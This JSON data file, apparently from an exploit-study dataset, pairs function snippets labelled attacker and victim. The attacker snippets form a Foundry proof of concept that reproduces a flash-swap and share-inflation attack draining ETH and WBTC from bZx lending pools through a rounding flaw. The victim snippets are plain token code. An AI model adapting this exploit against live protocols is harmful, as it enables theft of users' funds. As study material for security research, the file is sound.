[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        vm.label(address(YFI_WETH), \"YFI_WETH\");\n        vm.label(address(YFI), \"YFI\");\n        vm.label(address(iYFI), \"iYFI\");\n        vm.label(address(iETH), \"iETH\");\n        vm.label(address(iWBTC), \"iWBTC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(bzX), \"bzX\");\n        vm.label(address(SushiRouter), \"SushiRouter\");\n        vm.label(address(UniRouter), \"UniRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // In this POC I demonstrate first attack tx\n        deal(address(this), 0);\n        emit log_named_decimal_uint(\"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), 18);\n        uint256 yfiFlashAmount = YFI.balanceOf(address(YFI_WETH)) / 10;\n        // If the data.length is > 0 then pair contract recognizes flashswap instead of typical swap\n        bytes memory data = abi.encodePacked(uint8(48));\n        YFI_WETH.swap(yfiFlashAmount, 0, address(this), data);\n\n        emit log_named_decimal_uint(\"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        YFI.approve(address(iYFI), type(uint256).max);\n        // Referring to the tx, attack contract shares were burned before deposit/mint operation\n        vm.prank(originalAttackContract);\n        iYFI.burn(originalAttackContract, iYFIQuantity);\n\n        // At this point iYFI pool is empty\n        emit log_named_uint(\"Total underlying assets in the pool before deposit/mint\", YFI.balanceOf(address(iYFI)));\n        emit log_named_uint(\"Total shares before deposit/mint\", iYFI.totalSupply());\n\n        // Deposit 5 wei YFI and mint 5 wei iYFI\n        iYFI.mint(address(this), iYFIQuantity);\n\n        emit log_named_uint(\"Total underlying assets in the pool after deposit/mint\", YFI.balanceOf(address(iYFI)));\n        emit log_named_uint(\"Total shares after deposit/mint\", iYFI.totalSupply());\n        emit log_named_uint(\"Exploiter shares\", iYFI.balanceOf(address(this)));\n\n        // Add 5 wei YFI to this contract (these 5 wei YFI exploiter obtained when his shares were burned before)\n        // I do this because I want to stick strictly to the values presented in attack tx\n        deal(address(YFI), address(this), YFI.balanceOf(address(this)) + iYFIQuantity);\n        // Donate all YFI tokens to increase iYFI (shares that exploiter owns) value\n        YFI.transfer(address(iYFI), YFI.balanceOf(address(this)));\n\n        // Borrow/steal all ETH from iETH pool\n        stealETH();\n        // Borrow/steal all WBTC from iWBTC pool\n        stealWBTC();\n        // Exploiter successfully retrieved his collateral (shares) after borrowing/stealing tokens\n        // This is due to rounding issue in bZx contract\n        uint256 iYFIAmount = iYFI.balanceOf(address(this));\n        // Burn iYFI (5) and retrieve underlying YFI (19363816309062560436)\n        uint256 loanAmountPaid = iYFI.burn(address(this), iYFIAmount);\n\n        // Repay flashloan\n        uint256 amountOut = (((amount0 * 1000) + 1) / 997) - amount0;\n        WETHToYFI(amountOut);\n        YFI.transfer(address(YFI_WETH), YFI.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address _owner, address _spender)\n    public view returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address _spender, uint256 _value) public returns (bool) {\n    allowed[msg.sender][_spender] = _value;\n    emit Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address _owner) public view returns (uint256) {\n    return balances[_owner];\n  }\n\n}\n\n// File: openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "  function burn(uint256 _value) public {\n    _burn(msg.sender, _value);\n  }\n\n  function _burn(address _who, uint256 _value) internal {\n    require(_value <= balances[_who]);\n    // no need to require value <= totalSupply, since that would imply the\n    // sender's balance is greater than the totalSupply, which *should* be an assertion failure\n\n    balances[_who] = balances[_who].sub(_value);\n    totalSupply_ = totalSupply_.sub(_value);\n    emit Burn(_who, _value);\n    emit Transfer(_who, address(0), _value);\n  }\n}\n\n// File: openzeppelin-solidity/contracts/lifecycle/Pausable.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n}\n\nlibrary SafeMath {\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "  function mint(\n    address _to,\n    uint256 _amount\n  )\n    public\n    hasMintPermission\n    canMint\n    returns (bool)\n  {\n    totalSupply_ = totalSupply_.add(_amount);\n    balances[_to] = balances[_to].add(_amount);\n    emit Mint(_to, _amount);\n    emit Transfer(address(0), _to, _amount);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "  function totalSupply() public view returns (uint256) {\n    return totalSupply_;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "  function transfer(address _to, uint256 _value) public returns (bool) {\n    require(_value <= balances[msg.sender]);\n    require(_to != address(0));\n\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    emit Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "  function transferFrom(address _from, address _to, uint256 _value)\n    public returns (bool);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IToken",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IbZx",
    "source_type": "victim_contract",
    "function_name": "withdrawCollateral",
    "original_code": "",
    "description": ""
  }
]